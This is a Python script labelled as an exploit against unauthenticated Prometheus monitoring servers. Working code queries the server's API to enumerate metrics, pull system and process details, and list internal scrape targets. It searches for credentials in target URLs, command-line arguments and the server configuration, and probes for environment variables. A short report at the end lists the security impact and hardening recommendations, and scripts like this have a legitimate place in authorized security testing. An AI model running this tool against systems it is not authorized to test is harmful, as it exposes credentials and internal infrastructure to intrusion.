#!/usr/bin/env python3
"""
Exploit: Prometheus Information Disclosure
Target: Unauthenticated Prometheus endpoints
Impact: Sensitive information exposure
"""

import requests
import json
import sys
from datetime import datetime

class PrometheusExploit:
    def __init__(self, target="http://localhost:9090"):
        self.target = target
        self.sensitive_data = {
            "system_info": [],
            "credentials": [],
            "internal_services": [],
            "file_paths": [],
            "environment_vars": []
        }
    
    def extract_all_metrics(self):
        """Get list of all available metrics"""
        print("[*] Enumerating all available metrics...")
        try:
            r = requests.get(f"{self.target}/api/v1/label/__name__/values")
            if r.status_code == 200:
                metrics = r.json()['data']
                print(f"[+] Found {len(metrics)} metrics")
                
                # Look for interesting metric names
                interesting = [m for m in metrics if any(
                    keyword in m.lower() for keyword in 
                    ['password', 'secret', 'key', 'token', 'auth', 'api', 'user', 'admin']
                )]
                
                if interesting:
                    print(f"[!] Found {len(interesting)} potentially sensitive metrics:")
                    for metric in interesting[:10]:  # Show first 10
                        print(f"    - {metric}")
                
                return metrics
        except Exception as e:
            print(f"[-] Error: {e}")
        return []
    
    def extract_system_info(self):
        """Extract system and version information"""
        print("\n[*] Extracting system information...")
        
        queries = [
            ("node_uname_info", "System information"),
            ("node_os_info", "OS details"),
            ("node_dmi_info", "Hardware info"),
            ("node_systemd_unit_info", "Systemd services"),
            ("prometheus_build_info", "Prometheus version"),
            ("go_info", "Go runtime info"),
        ]
        
        for query, desc in queries:
            try:
                r = requests.get(f"{self.target}/api/v1/query?query={query}")
                if r.status_code == 200:
                    data = r.json()
                    if data['data']['result']:
                        print(f"\n[+] {desc}:")
                        for result in data['data']['result']:
                            metric = result['metric']
                            # Remove the metric name from labels
                            metric.pop('__name__', None)
                            if metric:
                                print(f"    {json.dumps(metric, indent=2)}")
                                self.sensitive_data['system_info'].append({
                                    'type': desc,
                                    'data': metric
                                })
            except Exception as e:
                continue
    
    def extract_network_info(self):
        """Extract network and service information"""
        print("\n[*] Extracting network information...")
        
        # Get all targets (reveals infrastructure)
        try:
            r = requests.get(f"{self.target}/api/v1/targets")
            if r.status_code == 200:
                targets = r.json()['data']['activeTargets']
                print(f"[+] Found {len(targets)} active targets:")
                
                for target in targets:
                    print(f"\n    Target: {target['scrapeUrl']}")
                    print(f"    Health: {target['health']}")
                    print(f"    Job: {target['labels'].get('job', 'unknown')}")
                    
                    # Look for credentials in URLs
                    if '@' in target['scrapeUrl']:
                        print("    [!] URL contains credentials!")
                        self.sensitive_data['credentials'].append(target['scrapeUrl'])
                    
                    # Store internal services
                    self.sensitive_data['internal_services'].append({
                        'url': target['scrapeUrl'],
                        'labels': target['labels']
                    })
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def extract_process_info(self):
        """Extract process and command line information"""
        print("\n[*] Extracting process information...")
        
        queries = [
            "node_processes_cmdline",
            "process_start_time_seconds",
            "process_cpu_seconds_total",
            "process_open_fds",
        ]
        
        for query in queries:
            try:
                r = requests.get(f"{self.target}/api/v1/query?query={query}")
                if r.status_code == 200:
                    data = r.json()
                    if data['data']['result']:
                        print(f"\n[+] {query}:")
                        for result in data['data']['result']:
                            value = result.get('value', ['', ''])[1]
                            metric = result.get('metric', {})
                            
                            # Look for sensitive command line args
                            if 'cmdline' in query and value:
                                if any(flag in value for flag in ['--password', '--token', '--key', '--secret']):
                                    print(f"    [!] Sensitive argument found: {value[:100]}...")
                                    self.sensitive_data['credentials'].append(value)
            except Exception as e:
                continue
    
    def extract_file_paths(self):
        """Extract file paths and directory information"""
        print("\n[*] Extracting file path information...")
        
        # Query filesystem metrics
        try:
            r = requests.get(f"{self.target}/api/v1/query?query=node_filesystem_files")
            if r.status_code == 200:
                data = r.json()
                if data['data']['result']:
                    print("[+] Mounted filesystems:")
                    for result in data['data']['result']:
                        mount = result['metric'].get('mountpoint', '')
                        device = result['metric'].get('device', '')
                        if mount and device:
                            print(f"    {mount} ({device})")
                            self.sensitive_data['file_paths'].append(mount)
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def extract_environment_info(self):
        """Try to extract environment variables"""
        print("\n[*] Looking for environment variables...")
        
        # Some exporters might expose env vars
        env_queries = [
            'process_environ_info',
            'node_environ_info',
            '{__name__=~".*env.*"}',
        ]
        
        for query in env_queries:
            try:
                r = requests.get(f"{self.target}/api/v1/query?query={query}")
                if r.status_code == 200:
                    data = r.json()
                    if data['data']['result']:
                        print(f"[+] Potential environment data found")
                        for result in data['data']['result']:
                            self.sensitive_data['environment_vars'].append(result)
            except Exception as e:
                continue
    
    def extract_configuration(self):
        """Extract Prometheus configuration"""
        print("\n[*] Extracting Prometheus configuration...")
        
        try:
            r = requests.get(f"{self.target}/api/v1/status/config")
            if r.status_code == 200:
                config = r.json()['data']['yaml']
                print("[+] Got Prometheus configuration")
                
                # Look for sensitive data in config
                sensitive_patterns = ['password', 'token', 'key', 'secret', 'bearer_token']
                for pattern in sensitive_patterns:
                    if pattern in config.lower():
                        print(f"    [!] Configuration contains '{pattern}'")
                
                # Extract job configurations
                if 'scrape_configs:' in config:
                    print("    [+] Scrape jobs configured")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def generate_report(self):
        """Generate a summary report of findings"""
        print("\n" + "="*50)
        print("INFORMATION DISCLOSURE SUMMARY")
        print("="*50)
        
        print(f"\nTarget: {self.target}")
        print(f"Scan Time: {datetime.now()}")
        
        if self.sensitive_data['credentials']:
            print(f"\n[!] Found {len(self.sensitive_data['credentials'])} potential credentials")
        
        if self.sensitive_data['internal_services']:
            print(f"\n[!] Discovered {len(self.sensitive_data['internal_services'])} internal services")
            for svc in self.sensitive_data['internal_services'][:5]:
                print(f"    - {svc['url']}")
        
        if self.sensitive_data['system_info']:
            print(f"\n[!] Extracted {len(self.sensitive_data['system_info'])} system details")
        
        print("\n[!] Security Impact:")
        print("    - No authentication required for Prometheus access")
        print("    - Exposes internal infrastructure details")
        print("    - May reveal credentials in metrics or labels")
        print("    - Provides reconnaissance information for attackers")
        
        print("\n[!] Recommendations:")
        print("    1. Implement authentication for Prometheus")
        print("    2. Use reverse proxy with auth (nginx/apache)")
        print("    3. Restrict network access to Prometheus")
        print("    4. Sanitize metric labels to remove sensitive data")
        print("    5. Disable unnecessary exporters and metrics")

def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = "http://localhost:9090"
    
    print("="*50)
    print("Prometheus Information Disclosure Exploit")
    print("="*50)
    
    exploit = PrometheusExploit(target)
    
    # Run all extraction methods
    exploit.extract_all_metrics()
    exploit.extract_system_info()
    exploit.extract_network_info()
    exploit.extract_process_info()
    exploit.extract_file_paths()
    exploit.extract_environment_info()
    exploit.extract_configuration()
    
    # Generate final report
    exploit.generate_report()

if __name__ == "__main__":
    main()